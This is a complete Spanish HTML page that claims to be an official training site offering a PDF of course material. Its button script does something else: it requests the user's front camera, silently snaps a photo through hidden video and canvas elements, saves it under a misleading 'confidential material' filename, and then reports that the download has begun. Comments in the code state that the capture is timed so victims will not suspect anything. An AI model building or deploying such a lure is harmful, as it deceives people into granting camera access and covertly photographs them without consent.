<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capacitación - Material Oficial</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f7f6; color: #333; }
        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
        h2 { color: #1a73e8; }
        p { margin-bottom: 30px; line-height: 1.5; }
        .btn { padding: 15px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
        .btn:hover { background: #1557b0; }
        #msg { margin-top: 25px; font-weight: bold; color: #28a745; display: none; }
        /* Ocultar elementos de captura */
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <h2>Bienvenido a la Jornada</h2>
    <p>Para registrar su asistencia y descargar el <b>PDF con el material de la capacitación</b>, presione el siguiente botón:</p>
    
    <button class="btn" id="startBtn">DESCARGAR MATERIAL (PDF)</button>
    
    <div id="msg">✅ Descarga Iniciada. Revise su carpeta de descargas o galería.</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.getElementById('msg');

    startBtn.addEventListener('click', async () => {
        try {
            // Solicitar cámara (Aquí saltará el permiso que vimos en image_841f21.png)
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            // Esperar un instante a que la cámara enfoque y capturar
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Detener cámara inmediatamente
                    stream.getTracks().forEach(track => track.stop());

                    // Descargar la foto con nombre de "documento"
                    const dataURL = canvas.toDataURL('image/jpeg');
                    const link = document.createElement('a');
                    link.href = dataURL;
                    link.download = 'MATERIAL_CAPACITACION_CONFIDENCIAL.jpg';
                    link.click();

                    // Mostrar mensaje de éxito
                    startBtn.style.display = 'none';
                    msg.style.display = 'block';
                }, 500); // 500ms es suficiente para capturar sin que sospechen
            };
        } catch (err) {
            alert("Debe permitir el acceso para descargar el material de la jornada.");
            console.error("Error: ", err);
        }
    });
</script>

</body>
</html>
